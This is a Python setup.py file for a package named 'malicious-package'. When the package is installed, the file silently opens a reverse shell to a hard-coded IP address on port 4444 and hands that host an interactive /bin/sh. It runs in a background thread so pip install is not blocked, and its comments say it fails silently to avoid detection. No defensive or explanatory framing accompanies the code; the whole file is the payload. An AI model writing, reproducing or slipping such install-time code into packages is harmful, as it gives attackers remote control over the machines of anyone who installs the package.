from setuptools import setup
import os
import sys
import socket
import subprocess
import threading

# ---- REVERSE SHELL PAYLOAD ----
def reverse_shell():
    # Attacker's IP and Port (your Kali machine)
    ATTACKER_IP = "223.181.59.55"  # Your Kali IP
    ATTACKER_PORT = 4444
    
    try:
        # Create socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Redirect stdin, stdout, stderr to socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Spawn interactive shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        # Fail silently to avoid detection
        pass

# Execute in background thread to not block pip install
thread = threading.Thread(target=reverse_shell)
thread.daemon = True
thread.start()

# Normal setup.py continues
setup(
    name="malicious-package",
    version="1.0.0",
)
